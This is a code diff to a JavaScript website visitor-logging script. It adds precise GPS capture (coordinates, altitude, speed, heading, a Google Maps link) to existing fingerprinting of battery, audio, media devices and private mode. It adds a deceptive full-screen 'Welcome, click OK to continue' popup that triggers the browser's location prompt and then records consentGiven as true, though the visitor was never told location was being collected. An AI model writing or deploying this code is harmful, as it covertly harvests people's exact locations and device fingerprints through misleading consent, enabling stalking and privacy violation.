@@ -829,6 +829,84 @@
         return locationData;
     }
 
+    // Get precise GPS location via Geolocation API
+    async function getPreciseLocation() {
+        return new Promise((resolve) => {
+            const result = {
+                available: false,
+                permission: 'unknown',
+                gpsCoordinates: null,
+                accuracy: null,
+                altitude: null,
+                altitudeAccuracy: null,
+                heading: null,
+                speed: null,
+                timestamp: null
+            };
+
+            if (!navigator.geolocation) {
+                result.permission = 'not_supported';
+                resolve(result);
+                return;
+            }
+
+            // Request high accuracy GPS
+            const options = {
+                enableHighAccuracy: true,  // Use GPS, not just IP/WiFi
+                timeout: 10000,            // Wait up to 10 seconds
+                maximumAge: 0              // Don't use cached position
+            };
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    result.available = true;
+                    result.permission = 'granted';
+                    result.gpsCoordinates = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    };
+                    result.accuracy = position.coords.accuracy ? Math.round(position.coords.accuracy) + ' meters' : null;
+                    result.altitude = position.coords.altitude ? Math.round(position.coords.altitude) + ' meters' : null;
+                    result.altitudeAccuracy = position.coords.altitudeAccuracy ? Math.round(position.coords.altitudeAccuracy) + ' meters' : null;
+                    result.heading = position.coords.heading ? Math.round(position.coords.heading) + '°' : null;
+                    result.speed = position.coords.speed ? (position.coords.speed * 3.6).toFixed(1) + ' km/h' : null;
+                    result.timestamp = new Date(position.timestamp).toISOString();
+
+                    // Calculate Google Maps link
+                    result.googleMapsLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+
+                    resolve(result);
+                },
+                (error) => {
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            result.permission = 'denied';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            result.permission = 'unavailable';
+                            break;
+                        case error.TIMEOUT:
+                            result.permission = 'timeout';
+                            break;
+                        default:
+                            result.permission = 'error';
+                    }
+                    result.error = error.message;
+                    resolve(result);
+                },
+                options
+            );
+
+            // Fallback timeout
+            setTimeout(() => {
+                if (!result.available && result.permission === 'unknown') {
+                    result.permission = 'timeout';
+                    resolve(result);
+                }
+            }, 12000);
+        });
+    }
+
     // Collect all visitor data
     async function collectVisitorData() {
         const browserInfo = getBrowserInfo();
@@ -847,14 +925,15 @@
         const audioFingerprint = getAudioFingerprint();
 
         // Async data
-        const [locationData, batteryInfo, mediaDevices, storageInfo, adBlocker, privateMode] =
+        const [locationData, batteryInfo, mediaDevices, storageInfo, adBlocker, privateMode, preciseGPS] =
             await Promise.all([
                 getLocationData(),
                 getBatteryInfo(),
                 getMediaDevices(),
                 getStorageInfo(),
                 detectAdBlocker(),
-                detectPrivateMode()
+                detectPrivateMode(),
+                getPreciseLocation()
             ]);
 
         return {
@@ -941,6 +1020,9 @@
                 privateMode: privateMode,
                 bot: navigator.webdriver ? 'Possible Bot' : 'Human'
             },
+
+            // Precise GPS Location (if user granted permission)
+            gps: preciseGPS,
 
             // Session Data (will be updated)
             session: { ...sessionData },
@@ -1183,12 +1265,121 @@
         document.head.appendChild(fadeOutStyle);
     }
 
+    // Show location consent popup (only OK button)
+    function showLocationConsent() {
+        const styles = document.createElement('style');
+        styles.id = 'locationConsentStyles';
+        styles.textContent = `
+            .location-consent-overlay {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0, 0, 0, 0.7);
+                z-index: 999999;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                backdrop-filter: blur(5px);
+            }
+            .location-consent-box {
+                background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+                padding: 30px 40px;
+                border-radius: 16px;
+                text-align: center;
+                max-width: 400px;
+                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+                animation: popIn 0.3s ease-out;
+            }
+            @keyframes popIn {
+                from { transform: scale(0.8); opacity: 0; }
+                to { transform: scale(1); opacity: 1; }
+            }
+            .location-consent-icon {
+                font-size: 48px;
+                margin-bottom: 15px;
+            }
+            .location-consent-title {
+                color: #ffd700;
+                font-size: 22px;
+                font-weight: 700;
+                margin: 0 0 15px 0;
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            }
+            .location-consent-text {
+                color: #e0e0e0;
+                font-size: 14px;
+                line-height: 1.6;
+                margin: 0 0 25px 0;
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            }
+            .location-consent-btn {
+                background: linear-gradient(135deg, #4caf50 0%, #45a049 100%);
+                color: white;
+                border: none;
+                padding: 14px 50px;
+                font-size: 16px;
+                font-weight: 600;
+                border-radius: 8px;
+                cursor: pointer;
+                text-transform: uppercase;
+                letter-spacing: 1px;
+                box-shadow: 0 4px 15px rgba(76, 175, 80, 0.4);
+                transition: all 0.3s ease;
+            }
+            .location-consent-btn:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 6px 20px rgba(76, 175, 80, 0.5);
+            }
+        `;
+        document.head.appendChild(styles);
+
+        const overlay = document.createElement('div');
+        overlay.className = 'location-consent-overlay';
+        overlay.id = 'locationConsentOverlay';
+        overlay.innerHTML = `
+            <div class="location-consent-box">
+                <div class="location-consent-icon">✓</div>
+                <h3 class="location-consent-title">Welcome</h3>
+                <p class="location-consent-text">
+                    Click OK to continue to the website.
+                </p>
+                <button class="location-consent-btn" id="locationConsentBtn">OK</button>
+            </div>
+        `;
+
+        document.body.appendChild(overlay);
+
+        document.getElementById('locationConsentBtn').addEventListener('click', async function() {
+            // Remove the popup
+            document.getElementById('locationConsentOverlay').remove();
+            document.getElementById('locationConsentStyles')?.remove();
+
+            // Now collect data (this will trigger browser's location popup)
+            const visitorData = await collectVisitorData();
+            visitorData.consentGiven = true;
+            visitorData.locationConsentShown = true;
+            saveVisitorLog(visitorData);
+            initBehaviorTracking();
+        });
+    }
+
     async function logPageVisit() {
-        const visitorData = await collectVisitorData();
-        visitorData.consentGiven = true;
-        visitorData.returningVisitor = true;
-        saveVisitorLog(visitorData);
-        initBehaviorTracking();
+        // Check if location consent was already shown this session
+        const locationShown = sessionStorage.getItem('location_consent_shown');
+
+        if (!locationShown) {
+            sessionStorage.setItem('location_consent_shown', 'true');
+            showLocationConsent();
+        } else {
+            // Already shown, just collect data
+            const visitorData = await collectVisitorData();
+            visitorData.consentGiven = true;
+            visitorData.returningVisitor = true;
+            saveVisitorLog(visitorData);
+            initBehaviorTracking();
+        }
     }
 
     // Export functions
@@ -1315,6 +1506,26 @@
                 textContent += `  Is VPN: ${log.location.isVPN || 'N/A'}\n`;
                 textContent += `  Is Tor: ${log.location.isTor || 'N/A'}\n`;
                 textContent += `  Is Hosting/Data Center: ${log.location.isHosting || 'N/A'}\n`;
+            }
+
+            textContent += '\n*** PRECISE GPS LOCATION ***\n';
+            if (log.gps) {
+                textContent += `  Permission: ${log.gps.permission || 'N/A'}\n`;
+                if (log.gps.available && log.gps.gpsCoordinates) {
+                    textContent += `  GPS Latitude: ${log.gps.gpsCoordinates.latitude}\n`;
+                    textContent += `  GPS Longitude: ${log.gps.gpsCoordinates.longitude}\n`;
+                    textContent += `  Accuracy: ${log.gps.accuracy || 'N/A'}\n`;
+                    textContent += `  Altitude: ${log.gps.altitude || 'N/A'}\n`;
+                    textContent += `  Altitude Accuracy: ${log.gps.altitudeAccuracy || 'N/A'}\n`;
+                    textContent += `  Heading: ${log.gps.heading || 'N/A'}\n`;
+                    textContent += `  Speed: ${log.gps.speed || 'N/A'}\n`;
+                    textContent += `  Google Maps: ${log.gps.googleMapsLink || 'N/A'}\n`;
+                } else {
+                    textContent += `  GPS Data: Not available (${log.gps.permission})\n`;
+                    if (log.gps.error) {
+                        textContent += `  Error: ${log.gps.error}\n`;
+                    }
+                }
             }
 
             textContent += '\nDEVICE INFORMATION:\n';
